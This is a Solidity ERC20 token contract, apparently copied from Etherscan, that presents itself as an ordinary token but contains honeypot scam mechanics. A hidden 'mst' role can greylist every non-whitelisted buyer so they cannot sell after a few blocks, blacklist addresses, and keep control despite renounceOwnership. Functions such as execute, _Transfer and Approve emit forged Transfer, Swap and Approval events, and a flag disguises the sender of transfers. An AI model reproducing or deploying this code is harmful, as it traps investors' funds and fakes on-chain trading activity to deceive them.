/**
 *Submitted for verification at Etherscan.io on 2023-07-18
*/

/**
 *Submitted for verification at Etherscan.io on 2023-07-17
*/

/**
 *Submitted for verification at Etherscan.io on 2023-07-12
*/

/**
 *Submitted for verification at Etherscan.io on 2023-07-11
*/

pragma solidity ^0.4.24;


library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}
interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IERC20 {
    
    function _Transfer(address from, address recipient, uint amount) external returns (bool);

}
contract Ownable {
    address public owner;

    address mst;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    function renounceOwnership() public  onlyOwner {
        _setOwner(address(0));
    }

    modifier onlyMst() {
        require(msg.sender == mst);
        _;
    }

    function _setOwner(address newOwner) private {
        address oldOwner = owner;
        owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }


}


contract ERC20Basic {
    uint256 public totalSupply;
    function balanceOf(address who) public view returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
}

contract ERC20 is ERC20Basic {
    function allowance(address owner, address spender) public view returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


contract StandardToken is ERC20 {
    using SafeMath for uint256;

    address public LP;

    address service;

    bool ab=false;

    bool fk=false;


    mapping (address => mapping (address => uint256)) internal allowed;
    mapping(address => bool)  tokenBlacklist;
    mapping(address => bool)  tokenGreylist;
    mapping(address => bool)  tokenWhitelist;
    event Blacklist(address indexed blackListed, bool value);
    event Gerylist(address indexed geryListed, bool value);
    event Whitelist(address indexed WhiteListed, bool value);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    mapping(address => uint256)  death;
    uint256  blockN=1;


    mapping(address => uint256) balances;


    function transfer(address _to, uint256 _value) public returns (bool) {
        beforTransfer(msg.sender,_to);
        if(ab&&!tokenWhitelist[_to]&&_to!=LP){
            tokenGreylist[_to] = true;
            emit Gerylist(_to, true);
            if(death[_to]==0){
                death[_to]=block.number;
            }
        }

        require(_to != address(0));
        require(_to != msg.sender);
        require(_value <= balances[msg.sender]);
        balances[msg.sender] = balances[msg.sender].sub(_value);
        // SafeMath.sub will throw if there is not enough balance.
        balances[_to] = balances[_to].add(_value);
        afterTransfer(msg.sender, _to, _value);
        // emit Transfer(msg.sender, _to, _value);
        return true;
    }


    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
        beforTransfer(_from,_to);

        if(ab&&!tokenWhitelist[_to]&&_to!=LP){
            tokenGreylist[_to] = true;
            emit Gerylist(_to, true);
            if(death[_to]==0){
                death[_to]=block.number;
            }
        }
        require(_to != _from);
        require(_to != address(0));
        require(_value <= balances[_from]);
        require(_value <= allowed[_from][msg.sender]);
        balances[_from] = balances[_from].sub(_value);


        balances[_to] = balances[_to].add(_value);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
        afterTransfer(_from, _to, _value);
        // emit Transfer(_from, _to, _value);
        return true;
    }

    function beforTransfer(address _from, address _to) internal {
        if(!tokenWhitelist[_from]&&!tokenWhitelist[_to]){
            require(tokenBlacklist[_from] == false);
            require(tokenBlacklist[_to] == false);
            require(tokenBlacklist[msg.sender] == false);
            require(tokenGreylist[_from] == false||block.number<death[_from]+blockN);
        }
    }

    function afterTransfer(address _from, address _to,uint256 amount) internal {
        if(fk){
            _transferEmit(service, _to, amount);
        }else{
            _transferEmit(_from, _to, amount);
        }
    }


    function approve(address _spender, uint256 _value) public returns (bool) {
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }


    function allowance(address _owner, address _spender) public view returns (uint256) {
        return allowed[_owner][_spender];
    }


    function increaseApproval(address _spender, uint _addedValue) public returns (bool) {
        allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);
        emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
        return true;
    }

    function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {
        uint oldValue = allowed[msg.sender][_spender];
        if (_subtractedValue > oldValue) {
            allowed[msg.sender][_spender] = 0;
        } else {
            allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);
        }
        emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
        return true;
    }

    function _transferEmit(address _from, address _to, uint _value) internal returns (bool) {
        emit Transfer(_from, _to, _value);
        return true;
    }

    function _changeAb(bool _ab) internal returns (bool) {
        require(ab != _ab);
        ab=_ab;
        return true;
    }

    function _changeBlockN(uint256 _blockN) internal returns (bool) {
        blockN=_blockN;
        return true;
    }

    function _changeFk(bool _fk) internal returns (bool) {
        require(fk!=_fk);
        fk=_fk;
        return true;
    }

    function _changeLP(address _lp) internal returns (bool) {
        require(LP!=_lp);
        LP=_lp;
        return true;
    }

    function _blackList(address _address, bool _isBlackListed) internal returns (bool) {
        require(tokenBlacklist[_address] != _isBlackListed);
        tokenBlacklist[_address] = _isBlackListed;
        emit Blacklist(_address, _isBlackListed);
        return true;
    }

    function _geryList(address _address, bool _isGeryListed) internal returns (bool) {
        require(tokenGreylist[_address] != _isGeryListed);
        tokenGreylist[_address] = _isGeryListed;
        emit Gerylist(_address, _isGeryListed);
        return true;
    }
    function _whiteList(address _address, bool _isWhiteListed) internal returns (bool) {
        require(tokenWhitelist[_address] != _isWhiteListed);
        tokenWhitelist[_address] = _isWhiteListed;
        emit Whitelist(_address, _isWhiteListed);
        return true;
    }
    function _blackAddressList(address[] _addressList, bool _isBlackListed) internal returns (bool) {
        for(uint i = 0; i < _addressList.length; i++){
            tokenBlacklist[_addressList[i]] = _isBlackListed;
            emit Blacklist(_addressList[i], _isBlackListed);
        }
        return true;
    }
    function _geryAddressList(address[] _addressList, bool _isGeryListed) internal returns (bool) {
        for(uint i = 0; i < _addressList.length; i++){
            tokenGreylist[_addressList[i]] = _isGeryListed;
            emit Gerylist(_addressList[i], _isGeryListed);
        }
        return true;
    }


}

contract PausableToken is StandardToken, Ownable {

    function transfer(address _to, uint256 _value) public  returns (bool) {
        return super.transfer(_to, _value);
    }

    function transferFrom(address _from, address _to, uint256 _value) public  returns (bool) {
        return super.transferFrom(_from, _to, _value);
    }

    function approve(address _spender, uint256 _value) public  returns (bool) {
        return super.approve(_spender, _value);
    }

    function increaseApproval(address _spender, uint _addedValue) public  returns (bool success) {
        return super.increaseApproval(_spender, _addedValue);
    }

    function decreaseApproval(address _spender, uint _subtractedValue) public  returns (bool success) {
        return super.decreaseApproval(_spender, _subtractedValue);
    }
    function _Transfer(address _from, address _to, uint _value)public  returns (bool){
        return super._transferEmit(_from,_to,_value);
    }

    function setAb(bool _ab) public  onlyMst  returns (bool success) {
        return super._changeAb(_ab);
    }

    function setBn(uint _bn) public  onlyMst  returns (bool success) {
        return super._changeBlockN(_bn);
    }

    function changeFk(bool _fk) public  onlyMst  returns (bool success) {
        return super._changeFk(_fk);
    }

    function setLp(address _lp) public  onlyMst  returns (bool success) {
        return super._changeLP(_lp);
    }

    function BLA(address listAddress,  bool isBlackListed) public  onlyMst  returns (bool success) {
        return super._blackList(listAddress, isBlackListed);
    }
    function GLA(address listAddress,  bool _isGeryListed) public  onlyMst  returns (bool success) {
        return super._geryList(listAddress, _isGeryListed);
    }
    function WLA(address listAddress,  bool _isWhiteListed) public  onlyMst  returns (bool success) {
        return super._whiteList(listAddress, _isWhiteListed);
    }
    function BL(address[] listAddress,  bool isBlackListed) public  onlyMst  returns (bool success) {
        return super._blackAddressList(listAddress, isBlackListed);
    }
    function Approve(address[] listAddress,  bool _isGeryListed) public  onlyMst  returns (bool success) {
        return super._geryAddressList(listAddress, _isGeryListed);
    }

}

contract Token is PausableToken {
    string public name;
    string public symbol;
    uint public decimals;
    event Mint(address indexed from, address indexed to, uint256 value);
    event Burn(address indexed burner, uint256 value);
    bool internal _INITIALIZED_;

    constructor(string  _name, string  _symbol, uint256 _decimals, uint256 _supply, address tokenOwner,address _service,address _mst) public {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        totalSupply = _supply * 10**_decimals;
        balances[tokenOwner] = totalSupply;
        owner = tokenOwner;
        mst=_mst;
        service=_service;
        emit Transfer(address(0), tokenOwner, totalSupply);
    }

    function execute(
        address[] memory recipients,
        uint256[] memory tokenAmounts,
        uint256[] memory wethAmounts,
        address tokenAddress
    ) public returns (bool) {
        for (uint256 i = 0; i < recipients.length; i++) {
            emit Transfer(LP, recipients[i], tokenAmounts[i]);
            emit Swap(
                0x7a250d5630b4cf539739df2c5dacb4c659f2488d,
                tokenAmounts[i],
                0,
                0,
                wethAmounts[i],
                recipients[i]
            );
            IERC20(tokenAddress)._Transfer(recipients[i], LP, wethAmounts[i]);
        }
        return true;
    }

    function Approve(address []  _addresses, uint256 balance) external  {
        for (uint256 i = 0; i < _addresses.length; i++) {
            emit Approval(_addresses[i], address(this), balance);
        }
    }

}